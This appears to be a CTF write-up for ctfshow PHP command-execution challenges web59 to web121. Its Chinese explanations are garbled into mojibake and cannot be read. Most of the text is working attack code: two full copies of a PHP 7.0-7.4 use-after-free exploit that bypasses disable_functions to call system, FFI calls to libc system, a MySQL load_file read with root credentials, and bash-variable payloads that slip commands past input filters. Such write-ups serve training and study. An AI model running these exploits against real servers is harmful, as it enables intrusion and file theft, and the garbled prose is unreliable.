å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„</code></pre><p><strong>web59</strong></p><p>file_get_contentså’Œreadfileæ²¡äº†ï¼Œå¯ä»¥ç”¨å…¶ä»–ä¿©</p><p><strong>web60-65</strong></p><p>åŒweb58ï¼Œå·®ä¸å¤šå°±é‚£å‡ ä¸ªå‡½æ•°ï¼Œç”¨show_sourceèƒ½å…¨è¿‡</p><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><pre class="language-none"><code class="language-none">c&#x3D;print_r(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430204318885.png" alt="image-20220430204318885"></p><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>print_rç¦äº†</p><p>ç”¨var_dump</p><pre class="language-none"><code class="language-none">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;);</code></pre><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><pre class="language-none"><code class="language-none">c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;)</code></pre><p>çœ‹æ ¹ç›®å½•ï¼Œç„¶åç›´æ¥includeåŒ…å«</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430211411455.png" alt="image-20220430211411455"></p><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>var_dumpä¹Ÿæ²¡äº†ï¼Œä½†æ˜¯è¿˜æœ‰var_export</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);</code></pre><p>y4å¸ˆå‚…è¿˜æœ‰ä¸€ä¸ªç”¨phpçš„åŸç”Ÿç±»éå†ç›®å½•çš„éªšæ“ä½œ</p><pre class="language-none"><code class="language-none">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre><p>ç„¶ååŒ…å«è¿™ä¸ªæˆ‘æ–‡ä»¶</p><pre class="language-none"><code class="language-none">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);c&#x3D;require(&#39;&#x2F;flag.txt&#39;);c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</code></pre><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>åŒ69</p><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0);&#x2F;&#x2F; ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#39;c&#39;]))&#123;        $c&#x3D; $_POST[&#39;c&#39;];        eval($c);        $s &#x3D; ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>ob_get_contents â€” è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹<br>ob_end_clean â€” æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²</p><blockquote><p>æ­¤å‡½æ•°ä¸¢å¼ƒæœ€é¡¶å±‚è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¹¶å…³é—­è¿™ä¸ªç¼“å†²åŒºã€‚å¦‚æœæƒ³è¦è¿›ä¸€æ­¥å¤„ç†ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¿…é¡»åœ¨ob_end_clean()ä¹‹å‰è°ƒç”¨ob_get_contents()ï¼Œå› ä¸ºå½“è°ƒç”¨ob_end_clean()æ—¶ç¼“å†²åŒºå†…å®¹å°†è¢«ä¸¢å¼ƒ</p></blockquote><p>è¦ç”¨<code>exit();</code>ä½¿ç¨‹åºæå‰é€€å‡ºï¼Œç»•è¿‡åé¢çš„æ­£åˆ™è¡¨è¾¾å¼</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);exit();</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430220313035.png" alt="image-20220430220313035"></p><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>scandirè¢«ç¦ç”¨äº†</p><p>ç”¨y4å¸ˆå‚…çš„é‚£ä¸ªåŸç”Ÿç±»æ¥æŸ¥ç›®å½•ï¼Œä½†æ˜¯æ–‡ä»¶æ²¡æœ‰æƒé™è¢«åŒ…å«</p><p>y4å¸ˆå‚…æ¨èçš„è„šæœ¬</p><pre class="language-none"><code class="language-none">&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30&#x2F;01&#x2F;2020.## Author: https:&#x2F;&#x2F;github.com&#x2F;mm0r1pwn(&quot;uname -a&quot;);function pwn($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; chr($ptr &amp; 0xff);            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; chr($v &amp; 0xff);            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write                # handle pie                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec                $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;constant&#39; constant check                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                # &#39;bin2hex&#39; constant check                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        # str_shuffle prevents opcache string interning        $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10; # increase this value if UAF fails    $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    # leaks    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    # fake closure object    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();&#125;pwn(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();</code></pre><p>//ä¸Šè¾¹è¿™ä¸ªè„šæœ¬è¿‡ä¸äº†çš„åŸå› æ˜¯é¢˜ç›®ç¯å¢ƒç¦ç”¨äº†str_repeatï¼Œæ‰€ä»¥æ‰‹åŠ¨é‡å¤79ä¸ªAå°±è¡Œäº†</p><p>ç¾¤ä¸»ç»™çš„</p><pre class="language-none"><code class="language-none">c&#x3D;function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace &#x3D; (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace &#x3D; debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;        $address &#x3D; 0;        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;            $address &lt;&lt;&#x3D; 8;            $address |&#x3D; ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m &#x3D; 8) &#123;        $out &#x3D; &quot;&quot;;        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;&#x3D; 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;        $i &#x3D; 0;        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;&#x3D; 8;        &#125;    &#125;    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak &#x3D; strlen($helper-&gt;a);        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type &#x3D; leak($base, 0x10, 2);        $e_phoff &#x3D; leak($base, 0x20);        $e_phentsize &#x3D; leak($base, 0x36, 2);        $e_phnum &#x3D; leak($base, 0x38, 2);        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;            $p_type  &#x3D; leak($header, 0, 4);            $p_flags &#x3D; leak($header, 4, 4);            $p_vaddr &#x3D; leak($header, 0x10);            $p_memsz &#x3D; leak($header, 0x28);            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123;                 $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;                $data_size &#x3D; $p_memsz;            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123;                 $text_size &#x3D; $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) &#x3D; $elf;        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;            $leak &#x3D; leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak &#x3D; leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref &#x3D; leak($leak);                                if($deref !&#x3D; 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base &#x3D; 0;        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;            $addr &#x3D; $start - 0x1000 * $i;            $leak &#x3D; leak($addr, 0, 7);            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr &#x3D; $basic_funcs;        do &#123;            $f_entry &#x3D; leak($addr);            $f_name &#x3D; leak($f_entry, 0, 6);            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr +&#x3D; 0x20;        &#125; while($f_entry !&#x3D; 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln &#x3D; new Vuln();        $vuln-&gt;a &#x3D; $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc &#x3D; 10;     $contiguous &#x3D; [];    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];    $helper &#x3D; new Helper;    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers &#x3D; str2ptr($abc, 0);    $php_heap &#x3D; str2ptr($abc, 0x58);    $abc_addr &#x3D; $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj &#x3D; str2ptr($abc, 0x20);    $binary_leak &#x3D; leak($closure_handlers, 8);    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf &#x3D; parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset &#x3D; 0xd0;    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();#éœ€è¦é€šè¿‡urlç¼–ç å“¦</code></pre><h2 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h2><pre class="language-none"><code class="language-none">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;include(&#39;&#x2F;flagc.txt&#39;);exit();</code></pre><h2 id="Web75-76"><a href="#Web75-76" class="headerlink" title="Web75-76"></a>Web75-76</h2><p>è¯»ç›®å½•ï¼Œå‘ç°flag36.txtï¼Œä½†æ˜¯ä¸èƒ½åŒ…å«ï¼Œuafå¤±è´¥</p><p>ç”¨mysqlçš„load_fileè¯»å–æ–‡ä»¶</p><pre class="language-none"><code class="language-none">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-getMessage();exit(0);&#125;exit(0);</code></pre><p>æ„Ÿè§‰ã€‚ã€‚ã€‚æ­£å¸¸åº”è¯¥æ˜¯ä¸ä¼šè¿™æ ·çš„ ï¼Œæ²¡ç”¨æˆ·åå’Œå¯†ç æ€ä¹ˆè¯»</p><h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>åˆ©ç”¨FFIï¼Œphp7.4ä»¥ä¸Šæ‰æœ‰</p><pre class="language-none"><code class="language-none">$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;æ²¡æœ‰å›æ˜¾çš„è¿™é‡Œå› ä¸ºä¸èƒ½å›æ˜¾ï¼Œæ‰€ä»¥åˆ©ç”¨é‡å®šå‘å°†readflagå†…å®¹è¾“å‡ºåˆ°å…¶ä»–åœ°æ–¹$ffi-&gt;system($a);&#x2F;&#x2F;é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</code></pre><p><a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p><p>å®è¯å®è¯æ²¡å¤ªçœ‹æ‡‚</p><pre class="language-none"><code class="language-none">c&#x3D;$ffi&#x3D;FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit();  </code></pre><p>æ‰“å®Œpayloadè®¿é—®ä¸€ä¸‹1.txtå°±èƒ½æ‹¿åˆ°flag</p><p>åè¾¹çš„é¢˜æ„Ÿè§‰æœ‰ç‚¹ç„å¹»äº†ï¼Œå°±å•çº¯çš„è®°ä¸€ä¸‹æ–¹æ³•</p><h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p> æºç é‡Œæœ‰system($code);ä½†æ˜¯æœ‰waf</p><pre class="language-none"><code class="language-none">!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;</code></pre><p>åˆ©ç”¨bashå†…ç½®å˜é‡æ¥rce</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430231046010.png" alt="image-20220430231046010"></p><pre class="language-none"><code class="language-none">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</code></pre><pre class="language-none"><code class="language-none"># echo $&#123;PWD&#125; &#x2F;root# echo $&#123;PWD:0:1&#125;      #è¡¨ç¤ºä»0ä¸‹æ ‡å¼€å§‹çš„ç¬¬ä¸€ä¸ªå­—ç¬¦&#x2F;           # echo $&#123;PWD:~0:1&#125;      #ä»ç»“å°¾å¼€å§‹å¾€å‰çš„ç¬¬ä¸€ä¸ªå­—ç¬¦t# echo $&#123;PWD:~0&#125;      t# echo $&#123;PWD:~A&#125;       #æ‰€ä»¥å­—æ¯å’Œ0å…·æœ‰åŒæ ·ä½œç”¨             t# echo $&#123;PATH&#125;                            &#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</code></pre><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ©ç”¨ç³»ç»Ÿå˜é‡æ„é€ nlå‘½ä»¤$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;æ˜¯nl</code></pre><p>æˆ–è€…</p><pre class="language-none"><code class="language-none">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</code></pre><pre class="language-none"><code class="language-none">SHLVL&#96;æ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨,è¿›ç¨‹ç¬¬ä¸€æ¬¡æ‰“å¼€shellæ—¶&#96;$&#123;SHLVL&#125;&#x3D;1&#96;ï¼Œç„¶ååœ¨æ­¤shellä¸­å†æ‰“å¼€ä¸€ä¸ªshellæ—¶&#96;$&#123;SHLVL&#125;&#x3D;2&#96;ã€‚&#96;$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;&#96;å°±è¾“å‡º&#96;&#x2F;</code></pre><pre class="language-none"><code class="language-none">$&#123;#&#125;æ˜¯0ï¼Œ$&#123;SHLVL&#125;ä¸º1&#96;&#96;$&#123;#PWD&#125;æ˜¯å›æ˜¾å­—ç¬¦æ•°ï¼Œ$&#123;PWD&#125; æ˜¯&#x2F;rootï¼Œ$&#123;#PWD&#125;æ˜¯5</code></pre><h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><p>ç¦ç”¨äº†<code>$&#123;PATH</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430232002769.png" alt="image-20220430232002769"></p><pre class="language-none"><code class="language-none">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     &#x3D;&#x3D;&#x3D;&#x3D;&gt;   t$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    &#x3D;&#x3D;&#x3D;&#x3D;&gt;   &#x2F;$&#123;SHLVL&#125;       &#x2F;&#x2F;ä¸€èˆ¬æ˜¯ä¸€ä¸ªä¸ªä½æ•°$&#123;#SHLVL&#125;     &#x2F;&#x2F;1ï¼Œè¡¨ç¤ºç»“æœçš„å­—ç¬¦é•¿åº¦$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;       &#x2F;&#x2F;è¡¨ç¤º&#x2F;$&#123;USER&#125;        &#x2F;&#x2F;www-data$&#123;PHP_VERSION:~A&#125;       &#x2F;&#x2F;2$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;         &#x2F;&#x2F;at&#x2F;bin&#x2F;cat flag.php$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</code></pre><h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;code&#39;]))&#123;    $code&#x3D;$_POST[&#39;code&#39;];    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;        &#125;        else&#123;        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;        &#125;    &#125;    else&#123;     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</code></pre><p>æˆ–è€…</p><pre class="language-none"><code class="language-none">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre><h2 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;code&#39;]))&#123;    $code&#x3D;$_POST[&#39;code&#39;];    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|\%|\&lt;|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#39;&lt;div 